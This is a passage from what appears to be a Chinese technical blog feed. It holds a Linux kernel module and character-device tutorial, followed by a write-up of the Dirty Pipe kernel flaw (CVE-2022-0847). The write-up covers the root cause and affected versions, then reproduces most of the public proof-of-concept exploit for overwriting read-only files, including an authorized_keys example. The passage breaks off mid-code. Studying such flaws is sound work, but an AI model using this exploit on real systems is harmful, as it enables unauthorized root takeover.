class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">__init 和__exit为两个宏</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// EXPORT_SYMBOL(gx);(声明符号表，使得该变量或者函数可以被其他模块调用)</span><br><span class="hljs-type">int</span> a = <span class="hljs-number">1</span>;<br><span class="hljs-type">char</span> *b = <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-type">int</span> c[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br>module_param(a,<span class="hljs-type">int</span>,<span class="hljs-number">0664</span>);<span class="hljs-comment">//内核模块传参,传参后内核函数可以直接使用这些参数</span><br>module_param(b,charp,<span class="hljs-number">0664</span>);<br>module_param(c,<span class="hljs-type">int</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0664</span>);<br><span class="hljs-type">int</span> __init <span class="hljs-title function_">my_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>    <span class="hljs-comment">//init函数必须为int类型</span><br>&#123;<br>    printk(<span class="hljs-string">&quot;just a test for linux kernel module test!\n&quot;</span>);<br>    printk(<span class="hljs-string">&quot;my init linux kernel module is running!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">void</span> __exit <span class="hljs-title function_">my_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//exit函数必须为void类型</span><br>    printk(<span class="hljs-string">&quot;just a test for linux kernel module test!\n&quot;</span>);<br><br>&#125;<br>module_init(my_init);<br><span class="hljs-comment">//当该内核模块插入时将会执行my_init函数</span><br>module_exit(my_exit);<br><span class="hljs-comment">//当该内核模块移除时将会执行my_exit函数</span><br>MODULE_LICENCE(<span class="hljs-string">&quot;GPL&quot;</span>);<span class="hljs-comment">//指定模块的开源协议</span><br>MODULE_AUTHOR(<span class="hljs-string">&quot;bugprogram-git&quot;</span>);<span class="hljs-comment">//指定模块的作者</span><br>MODULE_DESCRIPTION(<span class="hljs-string">&quot;just a kernel module test&quot;</span>);<span class="hljs-comment">//指定内核模块的详细信息</span><br>MODULE_ALIAS(<span class="hljs-string">&quot;mymodule&quot;</span>);<span class="hljs-comment">//指定模块的别名</span><br><span class="hljs-comment">//这些MODLE_*的本质其实是定义在static字符数组用于存放指定字符串内容，这些字符串内容链接时存放在.modinfo字段,可以用modinfo命令来查看这些模块信息,用法</span><br>modinfo $(MODULE_NAME)<span class="hljs-comment">//查看某个模块的信息</span><br></code></pre></td></tr></table></figure><h3 id="2-修改模块代码所在的目录的Kconfig文件"><a href="#2-修改模块代码所在的目录的Kconfig文件" class="headerlink" title="2.修改模块代码所在的目录的Kconfig文件"></a>2.修改模块代码所在的目录的Kconfig文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">config MY_MODULE<br>    tristate <span class="hljs-string">&quot;this is the linux kernel moule for test&quot;</span><br>    <span class="hljs-built_in">help</span><br>        just a <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><h3 id="3-修改该目录下的Makefile文件"><a href="#3-修改该目录下的Makefile文件" class="headerlink" title="3.修改该目录下的Makefile文件"></a>3.修改该目录下的Makefile文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">obj-$(CONFIG_MY_MODULE)         += module.o<br><span class="hljs-comment">#(这里的module.o要和.c文件的文件名一致,MY_MODULE要和Kconfig文件里面的指定一致)</span><br></code></pre></td></tr></table></figure><h3 id="4-运行内核模块"><a href="#4-运行内核模块" class="headerlink" title="4.运行内核模块"></a>4.运行内核模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">dmesg -C    <span class="hljs-comment">#清除内核已打印的信息</span><br>dmesg       <span class="hljs-comment">#查看内核打印信息</span><br>lsmod<span class="hljs-comment">#显示当前系统已经载入的模块</span><br>insmod<span class="hljs-comment">#将某个模块运行</span><br>dmesg<span class="hljs-comment">#查看内核打印信息</span><br></code></pre></td></tr></table></figure><h2 id="linux设备驱动开发"><a href="#linux设备驱动开发" class="headerlink" title="linux设备驱动开发"></a>linux设备驱动开发</h2><p>linux内核用设备号来区分不同的设备,设备号是一个32位的无符号整数,dev_t类型,而且设备号可以分为两个部分,</p><ul><li><p>1.主设备号</p><p>占12位</p></li><li><p>2.次设备号</p><p>占20位</p></li></ul><h4 id="常用的api"><a href="#常用的api" class="headerlink" title="常用的api"></a>常用的api</h4>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">MAJOR(<span class="hljs-type">dev_t</span> dev);<br><span class="hljs-comment">//获取设备号的主设备号</span><br>MINOR(<span class="hljs-type">dev_t</span> dev);<br><span class="hljs-comment">//获取设备的次设备号</span><br>MKDEV(<span class="hljs-type">int</span> major,<span class="hljs-type">int</span> minor);<br><span class="hljs-comment">//创建一个设备</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">register_chrdev_region</span><span class="hljs-params">(<span class="hljs-type">dev_t</span> from,<span class="hljs-type">unsigned</span> count,<span class="hljs-type">char</span> *name)</span>;<br><span class="hljs-comment">//手动注册一个设备到内核</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_chrdev_regionda</span><span class="hljs-params">(<span class="hljs-type">dev_t</span> *dev,<span class="hljs-type">unsigned</span> baseminor,<span class="hljs-type">unsigned</span> count,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span>;<br><br><span class="hljs-comment">//只需要主次设备号和fops即可注册设备</span><br><span class="hljs-type">int</span> __register_chrdev(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> major, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> baseminor,<br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name,<br>      <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> file_operations *fops)<br><span class="hljs-type">void</span> <span class="hljs-title function_">unregister_chrdev_region</span><span class="hljs-params">(<span class="hljs-type">dev_t</span> from,<span class="hljs-type">unsigned</span> count)</span>;<br><span class="hljs-comment">//注销一个设备</span><br><span class="hljs-comment">//动态注册一个设备到内核中</span><br><span class="hljs-comment">//分配成功后会在/proc/devices中查看到设备号对应的设备名称</span><br>cdev_alloc(<span class="hljs-type">void</span>);<br>cdev_init(<span class="hljs-keyword">struct</span> cdev *dev,<span class="hljs-keyword">struct</span> file_operations *fops);<br>cdev_add(<span class="hljs-keyword">struct</span> cdev *dev,<span class="hljs-type">dev_t</span> devnum,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count);<br>cdev_del(<span class="hljs-keyword">struct</span> cdev *dev);<br><span class="hljs-comment">//将数据从内核空间拷贝到用户空间</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">copy_to_user</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *to,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *from,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> n)</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">copy_from_user</span><span class="hljs-params">(<span class="hljs-type">void</span> *to,<span class="hljs-type">void</span> *from,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> n)</span>;<br></code></pre></td></tr></table></figure><h4 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h4>  <pre><code class=" mermaid">graph LR;a(申请设备号)--&gt;b(注册设备号)--&gt;c(设置设备对应的file_ops)--&gt;d(将其加入到内核的链表中)</code></pre>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux内核驱动开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-0847漏洞原理及复现</title>
    <link href="/2022/04/17/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/04/17/CVE-2022-0847%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-0847漏洞原理及复现"><a href="#CVE-2022-0847漏洞原理及复现" class="headerlink" title="CVE-2022-0847漏洞原理及复现"></a>CVE-2022-0847漏洞原理及复现</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>由于内核中copy_page_to_iter_pipe和push_pipe函数的正确初始化存在缺陷,可能存在旧值,攻击者可以利用此漏洞对任意只读文件缓存页进行覆盖,缓存会在系统内保留一段时间,在这段时间内系统的其他进程访问到的该文件内容都是攻击者修改过的文件缓存区的内容,从而将普通用户权限提升至root权限</p><h3 id="受影响的linux内核版本"><a href="#受影响的linux内核版本" class="headerlink" title="受影响的linux内核版本"></a>受影响的linux内核版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">5.8 &lt;= Linux Kernel &lt; 5.16.11 / 5.15.25 / 5.10.102<br></code></pre></td></tr></table></figure><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb,<span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br>    ....<br>    <span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<br>        <span class="hljs-comment">//如果缓存不为空则继续写</span><br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>                 <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<br>                 <span class="hljs-type">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><br>                <span class="hljs-comment">//这里判断有没有设置PIPE_BUF_FLAG_CAN_MERGE标志位,有该标志位则可以写(如果该位置空间不够则另开一块空间写)</span><br>                 <span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>                     offset + chars &lt;= PAGE_SIZE) &#123;<br>                         ret = pipe_buf_confirm(pipe, buf);<br>                         <span class="hljs-keyword">if</span> (ret)<br>                                 <span class="hljs-keyword">goto</span> out;<br>                        <span class="hljs-comment">//写入内容</span><br>                         ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<br>                         <span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>                                 ret = -EFAULT;<br>                                 <span class="hljs-keyword">goto</span> out;<br>                         &#125;<br><br>                         buf-&gt;len += ret;<br>                         <span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>                                 <span class="hljs-keyword">goto</span> out;<br>                 &#125;<br>         &#125;<br><br>         <span class="hljs-keyword">for</span> (;;) &#123;<br>                 <span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>                         send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>                         <span class="hljs-keyword">if</span> (!ret)<br>                                 ret = -EPIPE;<br>                         <span class="hljs-keyword">break</span>;<br>                 &#125;<br><br>                 head = pipe-&gt;head;<br>&#125;<br></code></pre></td></tr></table></figure><p>在调用spice函数的时候会调用copy_page_to_iter_pipe函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params">                          <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>&#123;<br>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br>         <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_tail = pipe-&gt;tail;<br>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>         <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head = i-&gt;head;<br>                          buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>         &#125;<br>         <span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br>                 <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>         buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>         get_page(page);<br>         <span class="hljs-comment">//这里没有初始化标志位</span><br>         buf-&gt;page = page;<br>         buf-&gt;offset = offset;<br>         buf-&gt;len = bytes;<br><br>         pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>         i-&gt;iov_offset = offset + bytes;<br>         i-&gt;head = i_head;<br> out:<br>          i-&gt;count -= bytes;<br>         <span class="hljs-keyword">return</span> bytes;<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在调用函数spice的时候,系统会直接将缓存页替换成文件缓存页,并且没有初始化标志位,,由于spice函数在置换缓存页的时候没有对标志位进行初始化,所以该文件缓存页就会被误认为普通的缓存页，如果往管道里面写数据,就会把文件缓存页覆盖,缓存页会在系统内保存一段时间,导致后面访问的进程得到的该文件内容都是攻击者篡改的文件内容,以此可以通过覆盖关键文件达到提权的目的</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="hljs-comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="hljs-comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="hljs-comment"> * file contents in the page cache, even if the file is not permitted</span><br><span class="hljs-comment"> * to be written, immutable or on a read-only mount.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="hljs-comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="hljs-comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="hljs-comment"> * there before, it just provided an easy way to exploit it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="hljs-comment"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="hljs-comment"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="hljs-comment"> * cross a page boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PAGE_SIZE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="hljs-comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">prepare_pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> p[<span class="hljs-number">2</span>])</span><br>&#123;<br><span class="hljs-keyword">if</span> (pipe(p)) <span class="hljs-built_in">abort</span>();<br><br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> pipe_size = fcntl(p[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> buffer[<span class="hljs-number">4096</span>];<br><br><span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="hljs-comment">   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-type">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>write(p[<span class="hljs-number">1</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="hljs-comment">   leaving the flags initialized) */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br><span class="hljs-type">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>read(p[<span class="hljs-number">0</span>], buffer, n);<br>r -= n;<br>&#125;<br><br><span class="hljs-comment">/* the pipe is now empty, and if somebody adds a new</span><br><span class="hljs-comment">   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="hljs-comment">   will be mergeable */</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* dumb command-line argument parser */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-type">const</span> path = argv[<span class="hljs-number">1</span>];<br><span class="hljs-type">loff_t</span> offset = strtoul(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-type">const</span> data = argv[<span class="hljs-number">3</span>];<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> data_size = <span class="hljs-built_in">strlen</span>(data);<br><br><span class="hljs-keyword">if</span> (offset % PAGE_SIZE == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-type">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">loff_t</span> end_offset = offset + (<span class="hljs-type">loff_t</span>)data_size;<br><span class="hljs-keyword">if</span> (end_offset &gt; next_page) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* open the input file and validate the specified offset */</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> fd = open(path, O_RDONLY); <span class="hljs-comment">// yes, read-only! :-)</span><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;open failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-keyword">if</span> (fstat(fd, &amp;st)) &#123;<br>perror(<span class="hljs-string">&quot;stat failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Offset is not inside the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (end_offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* create the pipe with all flags initialized with</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="hljs-type">int</span> p[<span class="hljs-number">2</span>];<br>prepare_pipe(p);<br><br><span class="hljs-comment">/* splice one byte from before the specified offset into the</span><br><span class="hljs-comment">   pipe; this will add a reference to the page cache, but</span><br><span class="hljs-comment">   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="hljs-comment">   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br>--offset;<br><span class="hljs-type">ssize_t</span> 